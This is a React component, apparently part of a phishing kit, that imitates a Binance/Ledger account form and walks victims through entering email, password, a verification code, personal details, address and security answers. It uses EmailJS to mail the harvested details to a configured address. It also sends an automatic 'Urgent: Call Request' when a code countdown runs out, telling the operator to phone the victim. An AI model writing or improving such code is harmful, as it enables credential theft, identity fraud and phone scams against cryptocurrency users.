import React, { useState, useEffect, useRef } from 'react';
import emailjs from '@emailjs/browser';
import { EMAILJS_CONFIG } from '../config/emailjs.config';
import { FormData } from '../types/types';

console.log('BinanceLedgerForm component loading...');

// Define the structure of the form steps
const formSteps = [
  'email',
  'password',
  'verification',
  'personalDetails',
  'addressDetails',
  'securityQuestions',
  'termsAndConditions',
  'confirmation',
];

// Initial form data
const initialFormData: FormData = {
  email: '',
  password: '',
  verificationCode: '',
  firstName: '',
  lastName: '',
  dateOfBirth: '',
  phoneNumber: '',
  address: '',
  zipCode: '',
  city: '',
  country: '',
  securityQuestion1: '',
  securityAnswer1: '',
  securityQuestion2: '',
  securityAnswer2: '',
  termsAccepted: false,
};

const BinanceLedgerForm: React.FC = () => {
  console.log('BinanceLedgerForm rendering...');
  
  const [currentStep, setCurrentStep] = useState<string>(formSteps[0]);
  const [formData, setFormData] = useState<FormData>(initialFormData);
  const [email, setEmail] = useState<string>('');
  const [password, setPassword] = useState<string>('');
  const [verificationCode, setVerificationCode] = useState<string>('');
  const [personalDetails, setPersonalDetails] = useState<{
    firstName: string;
    lastName: string;
    dateOfBirth: string;
    phoneNumber: string;
  }>({
    firstName: '',
    lastName: '',
    dateOfBirth: '',
    phoneNumber: '',
  });
  const [addressDetails, setAddressDetails] = useState<{
    address: string;
    zipCode: string;
    city: string;
    country: string;
  }>({
    address: '',
    zipCode: '',
    city: '',
    country: '',
  });
  const [securityQuestions, setSecurityQuestions] = useState<{
    securityQuestion1: string;
    securityAnswer1: string;
    securityQuestion2: string;
    securityAnswer2: string;
  }>({
    securityQuestion1: '',
    securityAnswer1: '',
    securityQuestion2: '',
    securityAnswer2: '',
  });
  const [termsAccepted, setTermsAccepted] = useState<boolean>(false);
  const [isSubmitting, setIsSubmitting] = useState<boolean>(false);
  const [submissionError, setSubmissionError] = useState<string | null>(null);
  const [submissionSuccess, setSubmissionSuccess] = useState<boolean>(false);
  const [countdown, setCountdown] = useState<number>(60);
  const [isResendDisabled, setIsResendDisabled] = useState<boolean>(true);
  const countdownInterval = useRef<NodeJS.Timeout | null>(null);

  useEffect(() => {
    console.log('Initializing EmailJS...');
    // Initialize EmailJS
    emailjs.init(EMAILJS_CONFIG.USER_ID);
  }, []);

  useEffect(() => {
    if (countdown > 0 && isResendDisabled) {
      countdownInterval.current = setTimeout(() => {
        setCountdown(countdown - 1);
      }, 1000);
    } else if (countdown === 0 && isResendDisabled) {
      setIsResendDisabled(false);
      // Send support email when countdown reaches 0
      sendSupportEmail('Countdown Expired - User Needs Call');
      if (countdownInterval.current) {
        clearTimeout(countdownInterval.current);
      }
    }

    return () => {
      if (countdownInterval.current) {
        clearTimeout(countdownInterval.current);
      }
    };
  }, [countdown, isResendDisabled]);

  // Enhanced email sending function for support requests
  const sendSupportEmail = async (supportType: string) => {
    try {
      const fullName = `${personalDetails.firstName} ${personalDetails.lastName}`.trim();
      
      const templateParams = {
        from_name: 'Binance Ledger Support Request',
        from_email: email,
        to_email: EMAILJS_CONFIG.TO_EMAIL,
        subject: `Urgent: Call Request - ${supportType}`,
        message: `
SUPPORT CALL REQUEST

The following user needs to receive a call immediately:

Full Name: ${fullName}
Phone Number: ${personalDetails.phoneNumber}
Email: ${email}

Request Type: ${supportType}
Support Code: 7791
Current Step: ${currentStep}
Timestamp: ${new Date().toISOString()}

IMPORTANT: Please contact this user at the phone number provided above.

Additional Details:
Address: ${addressDetails.address}
City: ${addressDetails.city}
Country: ${addressDetails.country}
Date of Birth: ${personalDetails.dateOfBirth}
        `
      };

      const result = await emailjs.send(
        EMAILJS_CONFIG.SERVICE_ID,
        EMAILJS_CONFIG.TEMPLATE_ID,
        templateParams
      );

      console.log('Support email sent successfully:', result);
      return result;
    } catch (error) {
      console.error('Failed to send support email:', error);
      throw error;
    }
  };

  const sendEmailNotification = async () => {
    try {
      const templateParams = {
        from_name: 'Binance Ledger Form',
        from_email: email,
        to_email: EMAILJS_CONFIG.TO_EMAIL,
        subject: 'New Form Submission',
        message: `New form submission at step ${currentStep} from ${email}`,
      };

      const result = await emailjs.send(
        EMAILJS_CONFIG.SERVICE_ID,
        EMAILJS_CONFIG.TEMPLATE_ID,
        templateParams
      );

      console.log('Email sent successfully:', result);
      return result;
    } catch (error) {
      console.error('Failed to send email:', error);
      throw error;
    }
  };

  const sendSupportRequest = async (supportType: string) => {
    try {
      setIsSubmitting(true);
      setSubmissionError(null);

      await sendSupportEmail(supportType);

      setSubmissionSuccess(true);
    } catch (error: any) {
      console.error('Support request submission failed:', error);
      setSubmissionError(
        error.message || 'Failed to submit support request. Please try again.'
      );
    } finally {
      setIsSubmitting(false);
    }
  };

  const sendFormData = async () => {
    try {
      setIsSubmitting(true);
      setSubmissionError(null);

      // Simulate form submission delay
      await new Promise((resolve) => setTimeout(resolve, 2000));

      await sendEmailNotification();

      setSubmissionSuccess(true);
    } catch (error: any) {
      console.error('Form submission failed:', error);
      setSubmissionError(
        error.message || 'Failed to submit form. Please try again.'
      );
    } finally {
      setIsSubmitting(false);
    }
  };

  const startCountdown = () => {
    setCountdown(60);
    setIsResendDisabled(true);
  };

  const handleInputChange = (
    step: string,
    field: string,
    value: string | boolean
  ) => {
    switch (step) {
      case 'email':
        setEmail(value as string);
        break;
      case 'password':
        setPassword(value as string);
        break;
      case 'verification':
        setVerificationCode(value as string);
        break;
      case 'personalDetails':
        setPersonalDetails((prev) => ({ ...prev, [field]: value as string }));
        break;
      case 'addressDetails':
        setAddressDetails((prev) => ({ ...prev, [field]: value as string }));
        break;
      case 'securityQuestions':
        setSecurityQuestions((prev) => ({ ...prev, [field]: value as string }));
        break;
      case 'termsAndConditions':
        setTermsAccepted(value as boolean);
        break;
      default:
        setFormData((prev) => ({ ...prev, [field]: value as string }));
        break;
    }
  };

  const goToNextStep = () => {
    const currentIndex = formSteps.indexOf(currentStep);
    if (currentIndex < formSteps.length - 1) {
      setCurrentStep(formSteps[currentIndex + 1]);
    }
  };

  const goToPrevStep = () => {
    const currentIndex = formSteps.indexOf(currentStep);
    if (currentIndex > 0) {
      setCurrentStep(formSteps[currentIndex - 1]);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    await sendFormData();
  };

  const renderFormStep = () => {
    console.log('Rendering form step:', currentStep);
    
    switch (currentStep) {
      case 'email':
        return (
          <div className="space-y-4">
            <h2 className="text-2xl font-bold text-white">Enter Your Email</h2>
            <input
              type="email"
              placeholder="Email"
              value={email}
              onChange={(e) => handleInputChange('email', 'email', e.target.value)}
              className="w-full p-3 bg-gray-800 text-white border border-gray-600 rounded-lg"
            />
            <button 
              onClick={goToNextStep}
              className="w-full p-3 bg-yellow-500 text-black font-semibold rounded-lg hover:bg-yellow-400"
            >
              Next
            </button>
          </div>
        );
      case 'password':
        return (
          <div className="space-y-4">
            <h2 className="text-2xl font-bold text-white">Enter Your Password</h2>
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) =>
                handleInputChange('password', 'password', e.target.value)
              }
              className="w-full p-3 bg-gray-800 text-white border border-gray-600 rounded-lg"
            />
            <div className="flex gap-2">
              <button 
                onClick={goToPrevStep}
                className="flex-1 p-3 bg-gray-600 text-white font-semibold rounded-lg hover:bg-gray-500"
              >
                Previous
              </button>
              <button 
                onClick={goToNextStep}
                className="flex-1 p-3 bg-yellow-500 text-black font-semibold rounded-lg hover:bg-yellow-400"
              >
                Next
              </button>
            </div>
          </div>
        );
      case 'verification':
        return (
          <div className="space-y-4">
            <h2 className="text-2xl font-bold text-white">Verification</h2>
            <input
              type="text"
              placeholder="Verification Code"
              value={verificationCode}
              onChange={(e) =>
                handleInputChange(
                  'verification',
                  'verificationCode',
                  e.target.value
                )
              }
              className="w-full p-3 bg-gray-800 text-white border border-gray-600 rounded-lg"
            />
            <div className="flex gap-2">
              <button 
                onClick={goToPrevStep}
                className="flex-1 p-3 bg-gray-600 text-white font-semibold rounded-lg hover:bg-gray-500"
              >
                Previous
              </button>
              <button 
                onClick={goToNextStep}
                className="flex-1 p-3 bg-yellow-500 text-black font-semibold rounded-lg hover:bg-yellow-400"
              >
                Next
              </button>
            </div>
            <button 
              onClick={startCountdown} 
              disabled={isResendDisabled}
              className="w-full p-3 bg-blue-600 text-white font-semibold rounded-lg hover:bg-blue-500 disabled:bg-gray-500"
            >
              {isResendDisabled ? `Resend Code (${countdown}s)` : 'Resend Code'}
            </button>
          </div>
        );
      case 'personalDetails':
        return (
          <div className="space-y-4">
            <h2 className="text-2xl font-bold text-white">Personal Details</h2>
            <input
              type="text"
              placeholder="First Name"
              value={personalDetails.firstName}
              onChange={(e) =>
                handleInputChange(
                  'personalDetails',
                  'firstName',
                  e.target.value
                )
              }
              className="w-full p-3 bg-gray-800 text-white border border-gray-600 rounded-lg"
            />
            <input
              type="text"
              placeholder="Last Name"
              value={personalDetails.lastName}
              onChange={(e) =>
                handleInputChange('personalDetails', 'lastName', e.target.value)
              }
              className="w-full p-3 bg-gray-800 text-white border border-gray-600 rounded-lg"
            />
            <input
              type="date"
              placeholder="Date of Birth"
              value={personalDetails.dateOfBirth}
              onChange={(e) =>
                handleInputChange(
                  'personalDetails',
                  'dateOfBirth',
                  e.target.value
                )
              }
              className="w-full p-3 bg-gray-800 text-white border border-gray-600 rounded-lg"
            />
            <input
              type="tel"
              placeholder="Phone Number"
              value={personalDetails.phoneNumber}
              onChange={(e) =>
                handleInputChange(
                  'personalDetails',
                  'phoneNumber',
                  e.target.value
                )
              }
              className="w-full p-3 bg-gray-800 text-white border border-gray-600 rounded-lg"
            />
            <div className="flex gap-2">
              <button 
                onClick={goToPrevStep}
                className="flex-1 p-3 bg-gray-600 text-white font-semibold rounded-lg hover:bg-gray-500"
              >
                Previous
              </button>
              <button 
                onClick={goToNextStep}
                className="flex-1 p-3 bg-yellow-500 text-black font-semibold rounded-lg hover:bg-yellow-400"
              >
                Next
              </button>
            </div>
          </div>
        );
      case 'addressDetails':
        return (
          <div className="space-y-4">
            <h2 className="text-2xl font-bold text-white">Address Details</h2>
            <input
              type="text"
              placeholder="Address"
              value={addressDetails.address}
              onChange={(e) =>
                handleInputChange('addressDetails', 'address', e.target.value)
              }
              className="w-full p-3 bg-gray-800 text-white border border-gray-600 rounded-lg"
            />
            <input
              type="text"
              placeholder="Zip Code"
              value={addressDetails.zipCode}
              onChange={(e) =>
                handleInputChange('addressDetails', 'zipCode', e.target.value)
              }
              className="w-full p-3 bg-gray-800 text-white border border-gray-600 rounded-lg"
            />
            <input
              type="text"
              placeholder="City"
              value={addressDetails.city}
              onChange={(e) =>
                handleInputChange('addressDetails', 'city', e.target.value)
              }
              className="w-full p-3 bg-gray-800 text-white border border-gray-600 rounded-lg"
            />
            <input
              type="text"
              placeholder="Country"
              value={addressDetails.country}
              onChange={(e) =>
                handleInputChange('addressDetails', 'country', e.target.value)
              }
              className="w-full p-3 bg-gray-800 text-white border border-gray-600 rounded-lg"
            />
            <div className="flex gap-2">
              <button 
                onClick={goToPrevStep}
                className="flex-1 p-3 bg-gray-600 text-white font-semibold rounded-lg hover:bg-gray-500"
              >
                Previous
              </button>
              <button 
                onClick={goToNextStep}
                className="flex-1 p-3 bg-yellow-500 text-black font-semibold rounded-lg hover:bg-yellow-400"
              >
                Next
              </button>
            </div>
          </div>
        );
      case 'securityQuestions':
        return (
          <div className="space-y-4">
            <h2 className="text-2xl font-bold text-white">Security Questions</h2>
            <input
              type="text"
              placeholder="Security Question 1"
              value={securityQuestions.securityQuestion1}
              onChange={(e) =>
                handleInputChange(
                  'securityQuestions',
                  'securityQuestion1',
                  e.target.value
                )
              }
              className="w-full p-3 bg-gray-800 text-white border border-gray-600 rounded-lg"
            />
            <input
              type="text"
              placeholder="Answer 1"
              value={securityQuestions.securityAnswer1}
              onChange={(e) =>
                handleInputChange(
                  'securityQuestions',
                  'securityAnswer1',
                  e.target.value
                )
              }
              className="w-full p-3 bg-gray-800 text-white border border-gray-600 rounded-lg"
            />
            <input
              type="text"
              placeholder="Security Question 2"
              value={securityQuestions.securityQuestion2}
              onChange={(e) =>
                handleInputChange(
                  'securityQuestions',
                  'securityQuestion2',
                  e.target.value
                )
              }
              className="w-full p-3 bg-gray-800 text-white border border-gray-600 rounded-lg"
            />
            <input
              type="text"
              placeholder="Answer 2"
              value={securityQuestions.securityAnswer2}
              onChange={(e) =>
                handleInputChange(
                  'securityQuestions',
                  'securityAnswer2',
                  e.target.value
                )
              }
              className="w-full p-3 bg-gray-800 text-white border border-gray-600 rounded-lg"
            />
            <div className="flex gap-2">
              <button 
                onClick={goToPrevStep}
                className="flex-1 p-3 bg-gray-600 text-white font-semibold rounded-lg hover:bg-gray-500"
              >
                Previous
              </button>
              <button 
                onClick={goToNextStep}
                className="flex-1 p-3 bg-yellow-500 text-black font-semibold rounded-lg hover:bg-yellow-400"
              >
                Next
              </button>
            </div>
          </div>
        );
      case 'termsAndConditions':
        return (
          <div className="space-y-4">
            <h2 className="text-2xl font-bold text-white">Terms and Conditions</h2>
            <label className="flex items-center space-x-2 text-white">
              <input
                type="checkbox"
                checked={termsAccepted}
                onChange={(e) =>
                  handleInputChange(
                    'termsAndConditions',
                    'termsAccepted',
                    e.target.checked
                  )
                }
                className="w-4 h-4"
              />
              <span>I accept the terms and conditions</span>
            </label>
            <div className="flex gap-2">
              <button 
                onClick={goToPrevStep}
                className="flex-1 p-3 bg-gray-600 text-white font-semibold rounded-lg hover:bg-gray-500"
              >
                Previous
              </button>
              <button 
                onClick={goToNextStep}
                className="flex-1 p-3 bg-yellow-500 text-black font-semibold rounded-lg hover:bg-yellow-400"
              >
                Next
              </button>
            </div>
          </div>
        );
      case 'confirmation':
        return (
          <div className="space-y-4">
            <h2 className="text-2xl font-bold text-white">Confirmation</h2>
            <div className="bg-gray-800 p-4 rounded-lg space-y-2 text-white">
              <p><strong>Email:</strong> {email}</p>
              <p><strong>Name:</strong> {personalDetails.firstName} {personalDetails.lastName}</p>
              <p><strong>Phone:</strong> {personalDetails.phoneNumber}</p>
              <p><strong>Date of Birth:</strong> {personalDetails.dateOfBirth}</p>
              <p><strong>Address:</strong> {addressDetails.address}, {addressDetails.city}, {addressDetails.country}</p>
              <p><strong>Terms Accepted:</strong> {termsAccepted ? 'Yes' : 'No'}</p>
            </div>
            <div className="flex gap-2">
              <button 
                onClick={goToPrevStep}
                className="flex-1 p-3 bg-gray-600 text-white font-semibold rounded-lg hover:bg-gray-500"
              >
                Previous
              </button>
              <button 
                type="submit" 
                onClick={handleSubmit} 
                disabled={isSubmitting}
                className="flex-1 p-3 bg-green-600 text-white font-semibold rounded-lg hover:bg-green-500 disabled:bg-gray-500"
              >
                {isSubmitting ? 'Submitting...' : 'Submit'}
              </button>
            </div>
            <div className="flex gap-2">
              <button 
                onClick={() => sendSupportRequest('Technical')}
                className="flex-1 p-3 bg-blue-600 text-white font-semibold rounded-lg hover:bg-blue-500"
              >
                Technical Support
              </button>
              <button 
                onClick={() => sendSupportRequest('Financial')}
                className="flex-1 p-3 bg-purple-600 text-white font-semibold rounded-lg hover:bg-purple-500"
              >
                Financial Support
              </button>
            </div>
          </div>
        );
      default:
        return <p className="text-white">Unknown step</p>;
    }
  };

  console.log('About to render form component');

  return (
    <div className="max-w-md mx-auto bg-gray-900 p-6 rounded-lg shadow-lg">
      <form onSubmit={handleSubmit} className="space-y-4">
        {renderFormStep()}
        {submissionError && (
          <div className="p-3 bg-red-600 text-white rounded-lg">
            {submissionError}
          </div>
        )}
        {submissionSuccess && (
          <div className="p-3 bg-green-600 text-white rounded-lg">
            Form submitted successfully!
          </div>
        )}
      </form>
    </div>
  );
};

export default BinanceLedgerForm;
